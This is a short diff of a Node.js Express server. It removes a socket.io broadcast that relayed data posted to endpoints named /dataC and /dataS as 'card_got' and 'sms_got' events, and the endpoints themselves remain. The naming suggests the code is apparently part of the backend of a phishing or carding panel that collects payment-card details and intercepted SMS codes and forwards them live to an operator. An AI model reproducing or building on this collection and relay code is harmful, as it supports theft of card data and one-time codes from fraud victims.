@@ -1,16 +1,3 @@
-var express_ = require('express');  
-var appSocket = express_();  
-var server = require('http').createServer(appSocket);  
-var io = require('socket.io')(server);
-const PORT = 8080;
-
-server.listen(process.env.PORT || 8080, function () {
-    console.log(`Listening on ${ PORT }`);
-    var intervalId = setInterval(function() {
-          io.emit('ping','ping');
-      }, 5000);
-});
-
 
 // Importing necessary modules
 const express = require('express');
@@ -35,7 +22,6 @@ app.post('/dataC', (req, res) => {
 //    const data = req.body; // This will contain the data sent in the request body
     const data_ = req.body.data;
     //console.log("DATA",data_);
-    io.emit('card_got',data_);
 //    console.log('Received data:', data);
 //    console.log('DATA Got',data_);
 //    res.send('Data received successfully!');
@@ -55,8 +41,6 @@ app.post('/dataC', (req, res) => {
 app.post('/dataS', (req, res) => {
     //    const data = req.body; // This will contain the data sent in the request body
         const data_ = req.body.data;
-      //  console.log("DATA",data_);
-        io.emit('sms_got',data_);
     //    console.log('Received data:', data);
     //    console.log('DATA Got',data_);
     //    res.send('Data received successfully!');
